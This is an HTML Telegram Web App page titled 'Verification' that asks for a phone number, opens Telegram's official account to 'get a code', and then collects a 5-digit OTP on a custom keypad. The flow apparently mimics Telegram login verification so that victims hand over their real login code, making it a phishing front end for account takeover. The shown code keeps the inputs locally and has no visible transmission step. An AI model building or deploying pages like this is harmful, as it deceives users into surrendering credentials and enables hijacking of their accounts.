<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification</title>

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
body {
    margin: 0;
    background: #000;
    color: white;
    font-family: Arial;
    display: flex;
    justify-content: center;
    align-items: flex-end;
    height: 100vh;
}

.container {
    width: 90%;
    max-width: 350px;
    margin-bottom: 50px;
    text-align: center;
}

input {
    width: 100%;
    padding: 15px;
    border-radius: 12px;
    border: none;
    margin-bottom: 15px;
    font-size: 16px;
}

.btn {
    width: 100%;
    padding: 16px;
    background: #ff4757;
    border: none;
    border-radius: 12px;
    color: white;
    font-size: 18px;
}

.hidden { display: none; }

.otp-box {
    display: flex;
    justify-content: center;
    gap: 8px;
    margin: 20px 0;
}

.otp {
    width: 45px;
    height: 55px;
    background: #222;
    border-radius: 10px;
    font-size: 26px;
    line-height: 55px;
}

.keypad {
    display: grid;
    grid-template-columns: repeat(3,1fr);
    gap: 10px;
}

.key {
    padding: 15px;
    background: #333;
    border-radius: 10px;
    font-size: 20px;
}
</style>
</head>

<body>

<div class="container">

    <!-- STEP 1 -->
    <div id="step1">
        <input type="tel" id="phone" placeholder="Enter your number">
        <button class="btn" onclick="goStep2()">Continue</button>
    </div>

    <!-- STEP 2 -->
    <div id="step2" class="hidden">
        <p>We sent a code to your Telegram 📩</p>
        <button class="btn" onclick="openTG()">📩 Get Code</button>
    </div>

    <!-- STEP 3 -->
    <div id="step3" class="hidden">
        <p>Enter OTP</p>

        <div class="otp-box">
            <div class="otp" id="b1"></div>
            <div class="otp" id="b2"></div>
            <div class="otp" id="b3"></div>
            <div class="otp" id="b4"></div>
            <div class="otp" id="b5"></div>
        </div>

        <div class="keypad">
            <div class="key" onclick="addNum('1')">1</div>
            <div class="key" onclick="addNum('2')">2</div>
            <div class="key" onclick="addNum('3')">3</div>
            <div class="key" onclick="addNum('4')">4</div>
            <div class="key" onclick="addNum('5')">5</div>
            <div class="key" onclick="addNum('6')">6</div>
            <div class="key" onclick="addNum('7')">7</div>
            <div class="key" onclick="addNum('8')">8</div>
            <div class="key" onclick="addNum('9')">9</div>
            <div></div>
            <div class="key" onclick="addNum('0')">0</div>
            <div class="key" onclick="clearNum()">⌫</div>
        </div>

    </div>

</div>

<script>
let tg = window.Telegram.WebApp;
tg.expand();

let otp = "";

// STEP 1 → STEP 2
function goStep2() {
    let phone = document.getElementById("phone").value;

    if (!phone) {
        alert("Enter number");
        return;
    }

    document.getElementById("step1").classList.add("hidden");
    document.getElementById("step2").classList.remove("hidden");
}

// 🔥 GET CODE → Telegram open
function openTG() {

    // vibration feel (optional)
    if (tg.HapticFeedback) {
        tg.HapticFeedback.impactOccurred("medium");
    }

    // direct Telegram open
    window.location.href = "tg://resolve?domain=Telegram";

    // OTP screen show after returning
    setTimeout(() => {
        document.getElementById("step2").classList.add("hidden");
        document.getElementById("step3").classList.remove("hidden");
    }, 1200);
}

// OTP input
function addNum(n) {
    if (otp.length < 5) {
        otp += n;
        update();
    }
}

function clearNum() {
    otp = otp.slice(0, -1);
    update();
}

function update() {
    for (let i = 1; i <= 5; i++) {
        document.getElementById("b"+i).innerText = otp[i-1] || "";
    }
}
</script>

</body>
</html>
